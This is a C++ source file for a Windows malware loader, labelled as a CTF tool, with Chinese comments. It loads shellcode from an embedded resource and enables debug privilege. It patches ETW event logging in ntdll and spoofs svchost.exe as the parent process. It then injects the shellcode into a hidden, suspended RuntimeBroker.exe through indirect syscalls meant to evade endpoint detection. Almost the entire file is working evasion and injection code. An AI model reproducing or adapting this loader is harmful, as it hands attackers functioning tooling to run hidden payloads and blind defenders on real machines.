#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include "resource.h"

// =============================================================
// [完全手動定義區] 
// =============================================================

// 1. 定義 UNICODE_STRING
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// 2. 定義 CLIENT_ID
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

// 3. 定義 OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// 4. 初始化 OBJECT_ATTRIBUTES 的巨集
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
#endif

// 5. 確保 NT_SUCCESS 巨集
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// 6. PPID 常數定義
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

// =============================================================
// [外部函數連結 - Sw3 版本]
// 對應 Syscalls.asm 裡面的 Sw3Nt... 標籤
// =============================================================
extern "C" {
    NTSTATUS Sw3NtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );

    NTSTATUS Sw3NtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    NTSTATUS Sw3NtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToWrite,
        PSIZE_T NumberOfBytesWritten
    );

    NTSTATUS Sw3NtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );

    NTSTATUS Sw3NtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        ULONG_PTR ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    );

    NTSTATUS Sw3NtClose(
        HANDLE Handle
    );
}

// =============================================================
// [Loader 邏輯]
// =============================================================

bool LoadShellcodeFromResource(int resourceID, std::vector<unsigned char>& buffer) {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;
    DWORD dataSize = SizeofResource(NULL, hRes);
    void* pData = LockResource(hData);
    if (dataSize == 0 || !pData) return false;
    buffer.resize(dataSize);
    memcpy(buffer.data(), pData, dataSize);
    return true;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) { CloseHandle(hToken); return false; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) { CloseHandle(hToken); return false; }
    CloseHandle(hToken);
    return true;
}

void BypassETW_Syscalls() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;

    unsigned char patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret

    PVOID baseAddr = pEtwEventWrite;
    SIZE_T regionSize = sizeof(patch);
    ULONG oldProtect = 0;
    NTSTATUS status;

    // [Sw3 修改] 修改權限
    status = Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    if (NT_SUCCESS(status)) {
        SIZE_T bytesWritten = 0;
        // [Sw3 修改] 寫入 Patch
        status = Sw3NtWriteVirtualMemory(GetCurrentProcess(), pEtwEventWrite, patch, sizeof(patch), &bytesWritten);

        if (NT_SUCCESS(status)) {
            std::cout << "[+] ETW Patched via Indirect Syscalls." << std::endl;
        }

        ULONG tempProtect = 0;
        // [Sw3 修改] 還原權限
        Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, oldProtect, &tempProtect);
    }
}

HANDLE GetSvchostHandle(DWORD* outPid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE hProcess = NULL;
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, "svchost.exe") == 0) {
                    hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        *outPid = pe32.th32ProcessID;
                        break;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return hProcess;
}

int main() {
    std::cout << "=== CTF Malware Loader (Full Indirect Syscalls - Sw3) ===" << std::endl;

    std::vector<unsigned char> payload_shellcode;
    if (!LoadShellcodeFromResource(IDR_RCDATA1, payload_shellcode)) {
        std::cout << "[-] Resource load failed! Check IDR_RCDATA1 definition." << std::endl;
        return 1;
    }

    EnableDebugPrivilege();
    BypassETW_Syscalls();

    DWORD parentPid = 0;
    HANDLE hParentProcess = GetSvchostHandle(&parentPid);
    if (!hParentProcess) {
        std::cout << "[-] Could not find accessible svchost.exe." << std::endl;
        return 1;
    }
    std::cout << "[+] Parent Found: svchost.exe (PID: " << parentPid << ")" << std::endl;

    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize = 0;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        std::cout << "[-] PPID Update Failed." << std::endl;
        return 1;
    }

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    char targetCmdLine[] = "C:\\Windows\\System32\\RuntimeBroker.exe";
    std::cout << "[*] Spawning Target: " << targetCmdLine << std::endl;

    if (!CreateProcessA(NULL, targetCmdLine, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi)) {
        std::cout << "[-] CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Target Created! Child PID: " << pi.dwProcessId << std::endl;

    // --- Injection Sequence (Indirect Syscalls Sw3) ---
    NTSTATUS status;
    PVOID remoteMem = NULL;
    SIZE_T regionSize = payload_shellcode.size();

    std::cout << "[*] Allocating memory via Syscall..." << std::endl;
    // [Sw3 修改]
    status = Sw3NtAllocateVirtualMemory(pi.hProcess, &remoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        std::cout << "[-] Sw3NtAllocateVirtualMemory Failed: 0x" << std::hex << status << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    std::cout << "[*] Writing payload via Syscall..." << std::endl;
    SIZE_T bytesWritten = 0;
    // [Sw3 修改]
    status = Sw3NtWriteVirtualMemory(pi.hProcess, remoteMem, payload_shellcode.data(), payload_shellcode.size(), &bytesWritten);
    if (!NT_SUCCESS(status)) {
        std::cout << "[-] Sw3NtWriteVirtualMemory Failed: 0x" << std::hex << status << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    std::cout << "[*] Executing payload via Syscall..." << std::endl;
    HANDLE hThread = NULL;
    // [Sw3 修改]
    status = Sw3NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        pi.hProcess,
        remoteMem,
        NULL,
        FALSE,
        0, 0, 0, NULL
    );

    if (NT_SUCCESS(status)) {
        std::cout << "[+] Injection Successful!" << std::endl;
        // [Sw3 修改]
        Sw3NtClose(hThread);
    }
    else {
        std::cout << "[-] Sw3NtCreateThreadEx Failed: 0x" << std::hex << status << std::endl;
    }

    // [Sw3 修改] 清理 Handles
    Sw3NtClose(hParentProcess);
    Sw3NtClose(pi.hProcess);
    Sw3NtClose(pi.hThread);

    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    std::cout << "\n[DONE] Loader finished." << std::endl;
    
    // [FIX] 改用 getchar() 而不是 system("pause")
    // 這可以防止產生額外的 cmd.exe 子進程，並確保視窗停駐
    getchar();
    return 0;
}